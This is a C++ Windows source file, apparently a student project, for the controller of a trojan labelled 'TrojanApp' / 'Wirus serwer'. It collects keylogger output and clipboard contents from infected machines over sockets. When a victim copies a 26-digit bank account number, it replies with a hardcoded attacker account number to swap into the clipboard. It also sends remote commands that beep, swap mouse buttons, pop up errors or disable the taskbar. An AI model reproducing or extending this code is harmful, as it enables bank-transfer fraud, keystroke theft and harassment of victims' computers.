#define _CRT_SECURE_NO_WARNINGS
#define ID_BUTTON_BEEP 0x8801
#define ID_BUTTON_SWAP 0x8802
#define ID_BUTTON_ERROR_POP_UP 0x8803
#define ID_BUTTON_TASK_BAR 0x8804

#include <Windows.h>
#include <stdlib.h>
#include <atomic>
#include <iostream>
#include <vector>
#include <string>
#include <deque>

#pragma comment(lib, "WSOCK32.lib")

//std::vector<bool> listOfBeepButtonsPressed;
//std::vector<bool> listOfSwapButtonsPressed;
//std::vector<bool> listOfErrorButtonsPressed;
//std::vector<bool> listOfTaskBarButtonsPressed;
std::deque<bool> listOfBeepButtonsPressed;
std::deque<bool> listOfSwapButtonsPressed;
std::deque<bool> listOfErrorButtonsPressed;
std::deque<bool> listOfTaskBarButtonsPressed;
std::atomic<int> numberOfConnectedClients = 0;


struct dataForThreadReceivingConnection_KL {
	HWND hwnd;
	HWND KL_textField;
};

struct dataForThreadReceivingData_KL {
	HWND hwnd;
	HWND KL_textField;
	SOCKET si;
};

struct dataForThreadReceivingConnection
{
	HWND mainWindowHandler;
	HWND accountNumberFieldHandler;
	HWND clipboardsFieldHandler;
};

struct dataForThreadReceivingData
{
	//Id of connected client
	int id;
	HWND mainWindowHandler;
	HWND accountNumberFieldHandler;
	HWND clipboardsFieldHandler;
	SOCKET si;
};

dataForThreadReceivingData_KL dataForKeyLoggerConnection;

DWORD WINAPI receivingData_KL(void * arguments);

DWORD WINAPI establishingConnection_KL(void *arguments);

DWORD WINAPI createWindow_KL(void* id);

DWORD WINAPI establishingConnection(void *arguments);

DWORD WINAPI receivingData(void *arguments);

DWORD WINAPI establishingConnection_CM(void *arguments);

DWORD WINAPI sendingCommands(void *arguments);

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

//main
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR pCmdLine, int nCmdShow)
{
	const LPCSTR CLASS_NAME = { "TrojanApp" };

	WNDCLASS wc = {};

	wc.lpfnWndProc = WindowProc;
	wc.hInstance = hInstance;
	wc.lpszClassName = CLASS_NAME;
	wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);

	RegisterClass(&wc);

	HWND hwnd = CreateWindowEx(0, CLASS_NAME, "Wirus serwer",
		WS_OVERLAPPEDWINDOW | WS_VISIBLE, CW_USEDEFAULT, CW_USEDEFAULT, 320, 500, NULL, NULL, hInstance, NULL);


	HWND accountNumber = CreateWindowEx(WS_EX_WINDOWEDGE, TEXT("Edit"), TEXT("81 1236 7431 9826 0000 4587 2003"),
		WS_CHILD | WS_VISIBLE, 0, 30, 320, 25, hwnd, NULL, NULL, NULL);

	HWND clipboards = CreateWindowEx(WS_EX_WINDOWEDGE, TEXT("Static"), TEXT(""),
		WS_CHILD | WS_VISIBLE, 0, 55, 320, 600, hwnd, NULL, NULL, NULL);

	HWND hwndButtonBeep = CreateWindow(
		"BUTTON",  // Predefined class; Unicode assumed 
		"BEEP!",      // Button text 
		WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,  // Styles 
		0,         // x position 
		0,         // y position 
		80,        // Button width
		30,        // Button height
		hwnd,     // Parent window
		(HMENU)ID_BUTTON_BEEP,       // No menu.
		(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),
		NULL);

	HWND hwndButtonSwapMouseButtons = CreateWindow(
		"BUTTON",  // Predefined class; Unicode assumed 
		"SWAP!",      // Button text 
		WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,  // Styles 
		80,         // x position 
		0,         // y position 
		80,        // Button width
		30,        // Button height
		hwnd,     // Parent window
		(HMENU)ID_BUTTON_SWAP,       // No menu.
		(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),
		NULL);

	HWND hwndButtonErrorPopUp = CreateWindow(
		"BUTTON",  // Predefined class; Unicode assumed 
		"ERROR!",      // Button text 
		WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,  // Styles 
		160,         // x position 
		0,         // y position 
		80,        // Button width
		30,        // Button height
		hwnd,     // Parent window
		(HMENU)ID_BUTTON_ERROR_POP_UP,       // No menu.
		(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),
		NULL);

	HWND hwndButtonDisableTaskBar = CreateWindow(
		"BUTTON",  // Predefined class; Unicode assumed 
		"TASK!",      // Button text 
		WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,  // Styles 
		240,         // x position 
		0,         // y position 
		80,        // Button width
		30,        // Button height
		hwnd,     // Parent window
		(HMENU)ID_BUTTON_TASK_BAR,       // No menu.
		(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),
		NULL);


	dataForThreadReceivingConnection data;
	data.mainWindowHandler = hwnd;
	data.accountNumberFieldHandler = accountNumber;
	data.clipboardsFieldHandler = clipboards;
	DWORD id;

	HANDLE listening = CreateThread(
		NULL,           // atrybuty bezpieczeñstwa
		0,              // inicjalna wielkoœæ stosu
		establishingConnection,  // funkcja w¹tku
		(void *)&data,// dane dla funkcji w¹tku
		0,              // flagi utworzenia
		&id);
	if (listening != INVALID_HANDLE_VALUE)
		SetThreadPriority(listening, THREAD_PRIORITY_NORMAL);

	DWORD id_CM;
	HANDLE listening_CM = CreateThread(
		NULL,           // atrybuty bezpieczeñstwa
		0,              // inicjalna wielkoœæ stosu
		establishingConnection_CM,  // funkcja w¹tku
		(void *)&data,// dane dla funkcji w¹tku
		0,              // flagi utworzenia
		&id_CM);
	if (listening_CM != INVALID_HANDLE_VALUE)
		SetThreadPriority(listening_CM, THREAD_PRIORITY_NORMAL);


	MSG message;
	WNDCLASS window;

	while (GetMessage(&message, (HWND)NULL, 0, 0))
	{
		TranslateMessage(&message);
		DispatchMessage(&message);
	}

	return message.wParam;
}

bool isThisAccountNumber(char *text)
{
	int length = 0;
	int len = strlen(text);
	for (int i = 0; i < len; i++)
	{
		if ((text[i] < '0' || text[i] > '9') && text[i] != ' ')
			return false;
		else
			if (text[i] != ' ')
				length++;
	}
	if (length == 26)
		return true;
	return false;
}

DWORD WINAPI createWindow_KL(void* arguments)
{
	int* clientId = (int*)arguments;
	std::string name;
	name = "Client " + std::to_string(*clientId);


	HWND hwnd = CreateWindowEx(0, "TrojanApp", name.c_str(),
		WS_OVERLAPPEDWINDOW | WS_VISIBLE, CW_USEDEFAULT, CW_USEDEFAULT, 320, 500, NULL, NULL, 0, NULL);

	HWND keyLoggerText = CreateWindowEx(WS_EX_CLIENTEDGE, TEXT("Static"), TEXT(""),
		WS_CHILD | WS_VISIBLE | ES_AUTOVSCROLL, 0, 0, 320, 500, hwnd, NULL, NULL, NULL);

	

	dataForThreadReceivingConnection_KL data;
	data.hwnd = hwnd;
	data.KL_textField = keyLoggerText;
	DWORD id;

	HANDLE listening_KL = CreateThread(
		NULL,           // atrybuty bezpieczeñstwa
		0,              // inicjalna wielkoœæ stosu
		establishingConnection_KL,  // funkcja w¹tku
		(void*)&data,// dane dla funkcji w¹tku
		0,              // flagi utworzenia
		&id);

	if (listening_KL != INVALID_HANDLE_VALUE)
		SetThreadPriority(listening_KL, THREAD_PRIORITY_NORMAL);

	MSG message;
	while (GetMessage(&message, (HWND)NULL, 0, 0))
	{
		TranslateMessage(&message);
		DispatchMessage(&message);
	}

	return 0;

}

DWORD WINAPI receivingData_KL(void * arguments)
{
	struct dataForThreadReceivingData_KL *myData = (struct dataForThreadReceivingData_KL*)arguments;

	SOCKET si = myData->si;
	char  buf[512];
	while (recv(si, buf, 512, 0) > 0)
	{
		int outLength = GetWindowTextLengthA(myData->KL_textField) + strlen(buf) + 2;

		char * new_buf = (char *)GlobalAlloc(GPTR, outLength * sizeof(char));
		if (new_buf == NULL)
		{
			GlobalFree(new_buf);
			continue;
		}


		GetWindowTextA(myData->KL_textField, new_buf, outLength - strlen(buf) + 2);

		strcat(new_buf, buf);

		SetWindowTextA(myData->KL_textField, new_buf);

		GlobalFree(new_buf);

	};

	return 0;
}

DWORD WINAPI establishingConnection_KL(void *arguments) {
	struct dataForThreadReceivingConnection_KL *myData = (struct dataForThreadReceivingConnection_KL *)arguments;
	
	WSADATA wsas;
	int result;
	WORD version;
	version = MAKEWORD(1, 1);
	result = WSAStartup(version, &wsas);

	SOCKET s;
	s = socket(AF_INET, SOCK_STREAM, 0);

	struct  sockaddr_in  sa;
	memset((void *)(&sa), 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_port = htons(1373);
	sa.sin_addr.s_addr = htonl(INADDR_ANY);

	result = bind(s, (struct sockaddr FAR*)&sa, sizeof(sa));
	result = listen(s, 5);

	SOCKET  si;
	struct  sockaddr_in  sc;
	int  lenc;



	lenc = sizeof(sc);
	si = accept(s, (struct  sockaddr  FAR *) &sc, &lenc);


	dataForKeyLoggerConnection.hwnd = myData->hwnd;
	dataForKeyLoggerConnection.KL_textField = myData->KL_textField;
	dataForKeyLoggerConnection.si = si;

	DWORD id;
	HANDLE receiving = CreateThread(
		NULL,           // atrybuty bezpieczeñstwa
		0,              // inicjalna wielkoœæ stosu
		receivingData_KL,  // funkcja w¹tku
		(void*)&dataForKeyLoggerConnection, // dane dla funkcji w¹tku
		0,              // flagi utworzenia
		&id);
	if (receiving != INVALID_HANDLE_VALUE)
		SetThreadPriority(receiving, THREAD_PRIORITY_NORMAL);

	closesocket(s);
	return 0;
}

DWORD WINAPI establishingConnection(void *arguments)
{
	struct dataForThreadReceivingConnection *myData = (struct dataForThreadReceivingConnection *)arguments;
	
	WSADATA wsas;
	int result;
	WORD version;
	version = MAKEWORD(1, 1);
	result = WSAStartup(version, &wsas);

	SOCKET s;
	s = socket(AF_INET, SOCK_STREAM, 0);

	struct  sockaddr_in  sa;
	memset((void *)(&sa), 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_port = htons(1372);
	sa.sin_addr.s_addr = htonl(INADDR_ANY);

	result = bind(s, (struct sockaddr FAR*)&sa, sizeof(sa));
	result = listen(s, 5);

	SOCKET  si;
	struct  sockaddr_in  sc;
	int  lenc;


	while(true)
	{
		lenc = sizeof(sc);
		si = accept(s, (struct  sockaddr  FAR *) &sc, &lenc);

		dataForThreadReceivingData data;
		data.id = numberOfConnectedClients;


		DWORD id_KL;
		HANDLE createrWindow_KL = CreateThread(
			NULL,           // atrybuty bezpieczeñstwa
			0,              // inicjalna wielkoœæ stosu
			createWindow_KL,  // funkcja w¹tku
			(void*)&numberOfConnectedClients,// dane dla funkcji w¹tku
			0,              // flagi utworzenia
			&id_KL);

		if (createrWindow_KL != INVALID_HANDLE_VALUE)
			SetThreadPriority(createrWindow_KL, THREAD_PRIORITY_NORMAL);


		data.si = si;
		data.mainWindowHandler = myData->mainWindowHandler;
		data.accountNumberFieldHandler = myData->accountNumberFieldHandler;
		data.clipboardsFieldHandler = myData->clipboardsFieldHandler;
		DWORD id;
		HANDLE receiving = CreateThread(
			NULL,           // atrybuty bezpieczeñstwa
			0,              // inicjalna wielkoœæ stosu
			receivingData,  // funkcja w¹tku
			(void *)&data,// dane dla funkcji w¹tku
			0,              // flagi utworzenia
			&id);
		if (receiving != INVALID_HANDLE_VALUE)
			SetThreadPriority(receiving, THREAD_PRIORITY_NORMAL);


	}

	return 0;
}

DWORD WINAPI receivingData(void *arguments)
{
	struct dataForThreadReceivingData *myData = (struct dataForThreadReceivingData *)arguments;

	SOCKET si = myData->si;
	char  buf[512];
	while (recv(si, buf, 512, 0) > 0)
	{
		int outLength = GetWindowTextLengthA(myData->clipboardsFieldHandler) + strlen(buf) + 2;

		char * new_buf = (char *)GlobalAlloc(GPTR, outLength * sizeof(char));
		if (new_buf == NULL)
		{
			GlobalFree(new_buf);
			continue;
		}


		GetWindowTextA(myData->clipboardsFieldHandler, new_buf, outLength - strlen(buf) + 2);

		strcat(new_buf, buf);
		strcat(new_buf, "\n");

		SetWindowTextA(myData->clipboardsFieldHandler, new_buf);

		GlobalFree(new_buf);


		if (isThisAccountNumber(buf))
		{
			GetWindowTextA(myData->accountNumberFieldHandler, buf, GetWindowTextLengthA(myData->accountNumberFieldHandler) + 1);
			send(si, buf, 512, 0);
		}
	};

	return 0;
}

DWORD WINAPI establishingConnection_CM(void *arguments) {
	struct dataForThreadReceivingConnection *myData = (struct dataForThreadReceivingConnection *)arguments;
	//winsock
	WSADATA wsas;
	int result;
	WORD version;
	version = MAKEWORD(1, 1);
	result = WSAStartup(version, &wsas);

	SOCKET s;
	s = socket(AF_INET, SOCK_STREAM, 0);

	struct  sockaddr_in  sa;
	memset((void *)(&sa), 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_port = htons(1374);
	sa.sin_addr.s_addr = htonl(INADDR_ANY);

	result = bind(s, (struct sockaddr FAR*)&sa, sizeof(sa));
	result = listen(s, 5);

	SOCKET  si;
	struct  sockaddr_in  sc;
	int  lenc;


	while (true)
	{
		lenc = sizeof(sc);
		si = accept(s, (struct  sockaddr  FAR *) &sc, &lenc);

		dataForThreadReceivingData data;
		data.id = numberOfConnectedClients;
		listOfBeepButtonsPressed.push_back(false);
		listOfErrorButtonsPressed.push_back(false);
		listOfSwapButtonsPressed.push_back(false);
		listOfTaskBarButtonsPressed.push_back(false);

		numberOfConnectedClients++;

		data.si = si;
		data.mainWindowHandler = myData->mainWindowHandler;
		data.accountNumberFieldHandler = myData->accountNumberFieldHandler;
		data.clipboardsFieldHandler = myData->clipboardsFieldHandler;

		//Sending commands to Clients
		DWORD id2;
		HANDLE sendingCommandsT = CreateThread(
			NULL,           // atrybuty bezpieczeñstwa
			0,              // inicjalna wielkoœæ stosu
			sendingCommands,  // funkcja w¹tku
			(void *)&data,// dane dla funkcji w¹tku
			0,              // flagi utworzenia
			&id2);
		if (sendingCommandsT != INVALID_HANDLE_VALUE)
			SetThreadPriority(sendingCommandsT, THREAD_PRIORITY_NORMAL);


	}
	return 0;
}

DWORD WINAPI sendingCommands(void * arguments)
{
	struct dataForThreadReceivingData *myData = (struct dataForThreadReceivingData *)arguments;
	SOCKET si = myData->si;
	
	while (true) {
		if (myData->id < listOfBeepButtonsPressed.size()) {
			if (listOfBeepButtonsPressed[myData->id]) {
				char  buf[512] = { "BEEP" };
				send(si, buf, 512, 0);
				listOfBeepButtonsPressed[myData->id] = false;
			}
		}
		if (myData->id < listOfSwapButtonsPressed.size()) {
			if (listOfSwapButtonsPressed[myData->id]) {
				char  buf[512] = { "SWAP" };
				send(si, buf, 512, 0);
				listOfSwapButtonsPressed[myData->id] = false;
			}
		}
		if (myData->id < listOfErrorButtonsPressed.size()) {
			if (listOfErrorButtonsPressed[myData->id]) {
				char  buf[512] = { "ERROR_POP_UP" };
				send(si, buf, 512, 0);
				listOfErrorButtonsPressed[myData->id] = false;
			}
		}
		if (myData->id < listOfTaskBarButtonsPressed.size()) {
			if (listOfTaskBarButtonsPressed[myData->id]) {
				char buf[512] = { "TASK_BAR" };
				send(si, buf, 512, 0);
				listOfTaskBarButtonsPressed[myData->id] = false;
			}
		}
		

	}
	return 0;
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	switch (message)
	{
	case WM_COMMAND:
		switch (HIWORD(wParam))
		{
		case BN_CLICKED:
		{
			switch (LOWORD(wParam))
			{
			case ID_BUTTON_BEEP:
			{
				int listSize = listOfBeepButtonsPressed.size();
				for (int i = 0;i < listSize; i++) {
					listOfBeepButtonsPressed[i] = true;
				}
				break;
			}
			case ID_BUTTON_SWAP:
			{
				int listSize = listOfSwapButtonsPressed.size();
				for (int i = 0; i < listSize; i++) {
					listOfSwapButtonsPressed[i] = true;
				}
				break;
			}
			case ID_BUTTON_ERROR_POP_UP:
			{
				int listSize = listOfErrorButtonsPressed.size();
				for (int i = 0; i < listSize; i++) {
					listOfErrorButtonsPressed[i] = true;
				}
				break;
			}
			case ID_BUTTON_TASK_BAR:
			{
				int listSize = listOfTaskBarButtonsPressed.size();
				for (int i = 0; i < listSize; i++) {
					listOfTaskBarButtonsPressed[i] = true;
				}
				break;
			}
			}
			break;
		}
		}
		return (0);
	case WM_CREATE:
		return (0);

	case WM_DESTROY:
		PostQuitMessage(0);
		return (0);

	default:
		return DefWindowProc(hwnd, message, wParam, lParam);
	}
}